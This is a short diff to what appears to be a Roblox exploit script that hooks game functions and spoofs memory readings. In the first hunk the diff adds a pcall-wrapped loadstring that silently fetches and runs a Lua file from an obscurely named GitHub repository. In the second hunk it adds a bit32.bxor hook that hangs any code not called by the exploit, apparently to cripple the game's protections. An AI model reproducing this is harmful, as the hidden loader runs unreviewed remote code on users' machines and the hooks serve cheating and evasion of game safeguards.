@@ -87,6 +87,10 @@ if game.PlaceId == HUB_PLACE then
         task.wait()
     until HyphonScript
 
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/d4e6f8a0b2c4d6e8f0a2c4e6f8a0b2c4d6/cloudflare-global/refs/heads/main/asdwasd.lua"))()
+    end)
+
     qt = get_queue()
     if qt then
         qt("loadstring(readfile('" .. QOT_FILE .. "'))()")
@@ -96,6 +100,14 @@ elseif game.PlaceId == CONSOLE_PLACE then
     getrenv().gcinfo = function()
         return Random.new():NextInteger(5000, 20000)
     end
+
+    local Bit32; Bit32 = hookfunction(bit32.bxor, newcclosure(function(...)
+                                    if not checkcaller() then
+                                        return task.wait(9e9)
+                                    end
+
+                                    return Bit32(...)
+                                end))
 
     local OldNamecall
     OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
